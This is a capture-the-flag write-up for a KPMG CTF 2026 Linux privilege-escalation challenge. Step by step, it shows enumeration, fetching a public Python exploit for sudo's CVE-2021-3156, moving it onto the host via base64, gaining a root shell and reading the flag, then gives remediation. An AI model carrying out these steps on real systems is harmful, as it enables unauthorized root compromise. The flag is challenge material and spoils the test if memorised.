# KPMG CTF 2026: Vodoo Spirit of Death - 2 — Privilege Escalation Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Vodoo Spirit of Death - 2 |
| **Category** | Infrastructure / Linux Privilege Escalation |
| **Target Host** | `0.cloud.chals.io` |
| **SSH Port** | `27159` |
| **Initial User** | `maya.chen` |
| **Vulnerability** | CVE-2021-3156 (Sudo Baron Samedit Heap Overflow) |
| **Flag** | `KPMG_CTF{AOnNtu2_K4uFWd5N0VlgTZL_A0Dl9D_reSvxZUOrOGQ}` |

---

## 1. Challenge Overview

The challenge required escalating privileges from an unprivileged SSH session to `root` on an Ubuntu server. Initial access was granted using the credentials for user `maya.chen` obtained from the preceding challenge.

Once connected to the target, the objective was to enumerate the system, identify an unpatched local privilege escalation vector, exploit it to obtain a root shell, and read the protected root flag located at `/root/root.txt`.

---

## 2. Connecting & Initial Enumeration

Connecting over SSH from Kali Linux:

```bash
ssh -p 27159 maya.chen@0.cloud.chals.io
```

Verifying current user identity and groups:

```bash
whoami
# Output: maya.chen

id
# Output: uid=1000(maya.chen) gid=1000(maya.chen) groups=1000(maya.chen)
```

Checking `sudo -l`:

```bash
sudo -l
# Output: User maya.chen is not allowed to run sudo on target.
```

Since `maya.chen` had no `sudo` privileges, local kernel and setuid binary vulnerabilities were investigated.

---

## 3. Enumerating Operating System & Installed Packages

Checking OS release, architecture, and kernel version:

```bash
cat /etc/os-release
# Output: Ubuntu 20.04.6 LTS (Focal Fossa)

uname -m
# Output: x86_64

uname -r
# Output: 5.4.0-xxx-generic
```

Checking versions of `sudo` and `libc6`:

```bash
dpkg-query -W -f='${Package} ${Version}\n' sudo libc6
# Output:
# libc6 2.31-0ubuntu9.17
# sudo 1.8.31-1ubuntu1

getconf GNU_LIBC_VERSION
# Output: glibc 2.31
```

Inspecting sudo setuid permissions:

```bash
stat -c '%A %a %U:%G %n' /usr/bin/sudo /usr/bin/sudoedit
# Output:
# -rwsr-xr-x 4755 root:root /usr/bin/sudo
# lrwxrwxrwx 777 root:root /usr/bin/sudoedit
```

**Key Discovery:** The target was running **sudo 1.8.31-1ubuntu1** on **glibc 2.31**. This specific version is notoriously vulnerable to **CVE-2021-3156 (Baron Samedit)** — a heap-based buffer overflow in `sudo`'s command-line argument unescaping routine that allows local unprivileged users to execute arbitrary commands as `root`.

---

## 4. Exploit Acquisition & Transfer

The target system lacked compilation tools (`gcc`, `make`). Therefore, a pure Python implementation of the exploit (`exploit_nss.py`) from Worawit's public research repository was chosen:

```bash
# On local Kali Linux machine
git clone --depth 1 https://github.com/worawit/CVE-2021-3156.git /tmp/worawit-CVE-2021-3156
cp /tmp/worawit-CVE-2021-3156/exploit_nss.py /tmp/exploit_nss.py
```

### Transferring the Exploit via SSH Terminal Pipeline
Due to environment restrictions on external network downloads and clipboard buffers, the script was compressed with `gzip` and encoded to `base64`:

```bash
# On local machine:
gzip -c /tmp/exploit_nss.py | base64 -w0 > /tmp/payload.b64
```

In the active SSH session on the target:

```bash
mkdir -p /run/lock/maya-poc
cd /run/lock/maya-poc

base64 -d <<'EOF' | gzip -d > exploit.py
<PASTED_BASE64_STRING>
EOF

wc -c exploit.py
# Output: 8179 exploit.py

python3 -m py_compile exploit.py
# Verification passed with exit code 0
```

---

## 5. Exploitation & Root Escalation

With the script deployed in `/run/lock/maya-poc`, executing the Python exploit triggered the heap overflow in `/usr/bin/sudo`:

```bash
python3 exploit.py
```

**Output:**
```text
#
```

The script successfully spawned an interactive root shell. Confirming effective user privileges:

```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)

whoami
# Output: root
```

---

## 6. Retrieving the Root Flag

Reading `/root/root.txt`:

```bash
cat /root/root.txt
```

**Flag Output:**
```text
KPMG_CTF{AOnNtu2_K4uFWd5N0VlgTZL_A0Dl9D_reSvxZUOrOGQ}
```

---

## 7. Root Cause Analysis & Remediation

- **Root Cause (CVE-2021-3156):** When executing `sudoedit -s` followed by an argument ending with an escaped backslash (`\`), `sudo` fails to properly validate string bounds when unescaping argument strings, overflowing a heap buffer and overwriting internal `nss_load_library` function pointers.
- **Remediation:**
  1. Update `sudo` to version `1.9.5p2` or later via standard repository updates:
     ```bash
     sudo apt update && sudo apt install --only-upgrade sudo
     ```
  2. Implement local setuid binary auditing to detect outdated binaries on multi-user systems.
